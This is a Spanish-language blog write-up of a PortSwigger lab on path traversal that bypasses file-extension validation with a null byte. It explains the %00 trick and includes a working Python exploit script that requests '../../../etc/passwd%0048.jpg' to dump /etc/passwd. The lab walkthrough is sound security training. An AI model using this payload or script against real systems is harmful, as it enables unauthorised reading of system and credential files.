---
title: "06 File path traversal, validation of file extension with null byte bypass"
collection: publications
category: portswigger
permalink: publications/Directory Traversal/06_File path traversal, validation of file extension with null byte bypas
excerpt: 'Este laboratorio contiene una vulnerabilidad en la visualización de imágenes de productos. La aplicación valida que el nombre de archivo suministrado termine con la extensión de archivo esperada.'
date: 2024-12-07
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'File path traversal, validation of file extension with null byte bypass'
---

![logo]({{site.url}}/images/Directory Traversal/directory-traversal-06/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/Directory Traversal/directory-traversal-06/descripcion.png)

## Objetivo del laboratorio

Para resolver el laboratorio, recuperamos el contenido del archivo `/etc/passwd`.

## Analisis

La web valida la extensión del archivo, asi que necesitamos ingresarle un `Byte Null` que basicamente le indica ignora todo lo que llegue despues de este caracter `null`, asi que va a ignorar la extensión del archivo.

Caracter Nulo: `%00`

![Conf1]({{site.url}}/images/Directory Traversal/directory-traversal-06/conf1.png)

# Aprobado

![Aprobado]({{site.url}}/images/Directory Traversal/directory-traversal-06/aprobado.png)

# Codigo Python

```python
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def directory_traversal_exploit(url):
    image_url = url + '/image?filename=../../../etc/passwd%0048.jpg'
    r = requests.get(image_url, verify=False, proxies=proxies)
    if 'root:x' in r.text:
        print('(+) Exploit successful!')
        print('(+) The following is the content of the /etc/passwd file:')
        print(r.text)
    else:
        print('(-) Exploit failed.')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("(+) Exploiting the directory traversal vulnerability...")
    directory_traversal_exploit(url)

if __name__ == "__main__":
    main()
```